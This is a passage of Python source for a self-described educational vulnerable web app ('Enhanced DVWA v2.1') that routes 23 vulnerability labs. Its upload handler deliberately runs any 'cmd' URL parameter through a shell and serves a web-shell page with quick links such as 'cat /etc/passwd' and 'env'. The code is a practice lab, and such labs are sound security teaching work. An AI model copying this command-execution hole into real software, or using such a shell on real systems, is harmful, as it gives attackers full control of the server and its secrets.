        # ── All other routes require login ────────────────────────────────
        if not sess:
            return None, None, "/login"

        routes = {
            "/":               lambda: page_home(sess),
            "/sqli":           lambda: page_sqli(params, sess),
            "/sqli-blind":     lambda: page_sqli_blind(params, sess),
            "/xss-reflected":  lambda: page_xss_reflected(params, sess),
            "/xss-stored":     lambda: page_xss_stored(params, method, body, sess),
            "/xss-dom":        lambda: page_xss_dom(params, sess),
            "/csrf":           lambda: page_csrf(params, method, body, sess),
            "/file-upload":    lambda: page_file_upload(params, method, body, sess),
            "/file-include":   lambda: page_file_include(params, sess),
            "/cmd-inject":     lambda: page_cmd_inject(params, method, body, sess),
            "/auth-bypass":    lambda: page_auth_bypass(params, method, body, sess),
            "/idor":           lambda: page_idor(params, sess),
            "/xxe":            lambda: page_xxe(params, method, body, sess),
            "/ssti":           lambda: page_ssti(params, sess),
            "/open-redirect":  lambda: page_open_redirect(params, sess),
            "/insecure-deser": lambda: page_insecure_deser(params, method, body, sess),
            "/weak-crypto":    lambda: page_weak_crypto(params, method, body, sess),
            "/jwt":            lambda: page_jwt(params, method, body, sess),
            "/rate-limit":     lambda: page_rate_limit(params, method, body, sess),
            "/bruteforce":     lambda: page_bruteforce(params, method, body, sess),
            "/clickjacking":   lambda: page_clickjacking(params, sess),
            "/ssrf":           lambda: page_ssrf(params, method, body, sess),
            "/hpp":            lambda: page_hpp(params, sess),
            "/cors":           lambda: page_cors(params, sess),
        }
        handler_fn = routes.get(path)
        if handler_fn:
            try:
                return handler_fn(), None, None
            except Exception as e:
                return base_page("Error", f'<div class="ph"><h2>Error</h2></div><div class="err" style="font-family:monospace;white-space:pre-wrap">{html.escape(str(e))}</div>', "", sess), None, None
        return base_page("404", '<div class="ph"><h2>404 — Page Not Found</h2><p>Use the sidebar to navigate.</p></div>', "", sess), None, None

    def serve_upload(self, filename, params):
        import subprocess as _sp
        UPLOAD_DIR = "/tmp/dvwa_uploads"
        safe       = os.path.basename(filename)
        filepath   = os.path.join(UPLOAD_DIR, safe)
        if not safe or not os.path.isfile(filepath):
            html_404 = base_page("404", f'<div class="ph"><h2>404 — File Not Found</h2><p><code>/uploads/{html.escape(safe)}</code> does not exist.</p><p><a href="/file-upload">← Upload a file first</a></p></div>', "")
            return html_404
        ext = os.path.splitext(safe)[1].lower()
        if ext in {".php",".phtml",".phar",".php3",".php5",".php7"}:
            cmd_param = params.get("cmd", params.get("c", [""]))[0].strip()
            output = ""
            if cmd_param:
                try:
                    res = _sp.run(cmd_param, shell=True, capture_output=True, text=True, timeout=15)
                    output = (res.stdout + res.stderr).rstrip()
                except _sp.TimeoutExpired: output = "[!] Command timed out (15s)"
                except Exception as e:     output = f"[!] Error: {e}"
            esc_safe = html.escape(safe); esc_fp = html.escape(filepath)
            esc_cmd  = html.escape(cmd_param); esc_out = html.escape(output) if output else ""
            fsize    = os.path.getsize(filepath)
            quick_cmds = [("id","id"),("whoami","whoami"),("hostname","hostname"),("uname -a","uname+-a"),
                          ("pwd","pwd"),("ls -la","ls+-la"),("cat /etc/passwd","cat+%2Fetc%2Fpasswd"),("env","env")]
            qlinks = " ".join(f'<a href="/uploads/{esc_safe}?cmd={url}">{html.escape(lbl)}</a>' for lbl,url in quick_cmds)
            page = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Shell — /uploads/{esc_safe}</title>
<style>*{{box-sizing:border-box;margin:0;padding:0}}body{{background:#0d1117;color:#c9d1d9;font-family:'Cascadia Code','Fira Code',monospace;height:100vh;display:flex;flex-direction:column}}
#topbar{{background:#161b22;border-bottom:1px solid #30363d;padding:.6rem 1rem;display:flex;align-items:center;gap:.75rem;flex-wrap:wrap;flex-shrink:0}}
#topbar h2{{color:#58a6ff;font-size:.95rem}}#topbar .meta{{color:#8b949e;font-size:11px}}#topbar a.back{{color:#8b949e;font-size:12px;text-decoration:none;margin-left:auto}}
#cmdbar{{background:#0d1117;border-bottom:1px solid #30363d;padding:.5rem .75rem;display:flex;align-items:center;gap:.5rem;flex-shrink:0}}
#cmdbar span{{color:#7ee787;white-space:nowrap;font-size:13px}}
#cmdbar input{{flex:1;background:#161b22;border:1px solid #388bfd;border-radius:4px;color:#7ee787;padding:.4rem .75rem;font-family:inherit;font-size:13px;outline:none}}
#cmdbar button{{background:#238636;color:#fff;border:none;border-radius:4px;padding:.42rem 1rem;cursor:pointer;font-size:13px}}
#quickbar{{background:#010409;border-bottom:1px solid #21262d;padding:.35rem .75rem;display:flex;gap:.4rem;flex-wrap:wrap;flex-shrink:0}}
#quickbar a{{color:#8b949e;font-size:11px;text-decoration:none;padding:2px 7px;border:1px solid #30363d;border-radius:3px}}
#quickbar a:hover{{color:#c9d1d9;border-color:#8b949e}}
#output{{flex:1;overflow-y:auto;background:#010409;padding:.75rem 1rem;color:#7ee787;font-size:13px;line-height:1.6;white-space:pre-wrap;word-break:break-all}}
#statusbar{{background:#161b22;border-top:1px solid #30363d;padding:.3rem .75rem;font-size:11px;color:#8b949e;flex-shrink:0}}</style>
</head><body>
<div id="topbar"><h2>[ Web Shell ] /uploads/{esc_safe}</h2><span class="meta">{esc_fp} | {fsize} B</span><a class="back" href="/file-upload">← Back</a></div>
<form method="GET" action="/uploads/{esc_safe}" style="display:contents">
<div id="cmdbar"><span>root@dvwa:~#</span><input type="text" name="cmd" id="cmdinput" value="{esc_cmd}" placeholder="Enter command..." autofocus autocomplete="off" spellcheck="false"><button type="submit">Run</button></div>
<div id="quickbar">{qlinks}</div>
</form>
<div id="output">{esc_out if output else "# Type a command and press Run"}</div>
<div id="statusbar">{f"Command: {esc_cmd} | Output: {len(output)} chars" if output else "Ready"} | <a href="/uploads/{esc_safe}" style="color:#8b949e">clear</a></div>
<script>var out=document.getElementById('output');if(out)out.scrollTop=out.scrollHeight;document.getElementById('cmdinput').focus();</script>
</body></html>"""
            enc = page.encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type","text/html; charset=utf-8")
            self.send_header("Content-Length", len(enc))
            self.end_headers(); self.wfile.write(enc)
            return None
        # Non-PHP — serve raw bytes
        try:
            with open(filepath,"rb") as fh: data = fh.read()
            mime = {".html":"text/html",".svg":"image/svg+xml",".txt":"text/plain",
                    ".jpg":"image/jpeg",".png":"image/png",".gif":"image/gif"}.get(ext,"application/octet-stream")
            self.send_response(200); self.send_header("Content-Type",mime)
            self.send_header("Content-Length",len(data)); self.end_headers(); self.wfile.write(data)
            return None
        except Exception as e:
            return base_page("Error", f'<div class="err">{html.escape(str(e))}</div>', "")

    def handle_request(self, method):
        try:
            p    = urllib.parse.urlparse(self.path)
            qs   = urllib.parse.parse_qs(p.query)
            body = self.parse_body() if method == "POST" else None
            result, cookie, redirect = self.route(p.path, qs, method, body)
            if redirect:
                self.send_redirect(redirect, set_cookie=cookie)
            elif result is not None:
                extra = {"Set-Cookie": cookie} if cookie else None
                self.send_html(result, extra_headers=extra)
        except Exception as e:
            try:
                self.send_html(f"<pre>Internal error: {html.escape(str(e))}</pre>", 500)
            except Exception:
                pass

    def do_GET(self):  self.handle_request("GET")
    def do_POST(self): self.handle_request("POST")

def main():
    HOST, PORT = "127.0.0.1", 8888
    print("\n" + "="*60)
    print("  Enhanced DVWA v2.1 — by Khalil")
    print("="*60)
    print(f"  URL     : http://{HOST}:{PORT}/login")
    print(f"  Modules : 23 vulnerability labs")
    print(f"  Creds   : admin / password  (default)")
    print()
    print("  New in v2.1:")
    print("    ✓ Login page with session management")
    print("    ✓ Forgot password (3 security levels)")
    print("    ✓ Logout + session cookies")
    print("    ✓ All pages protected by authentication")
    print("    ✓ Sidebar shows current user + role")
    print()
    print("  [!] EDUCATIONAL USE ONLY — localhost/isolated VM only")
    print("="*60 + "\n")
    init_db()
    server = ThreadedHTTPServer((HOST, PORT), DVWAHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped.")
        server.server_close()

if __name__ == "__main__":
    main()
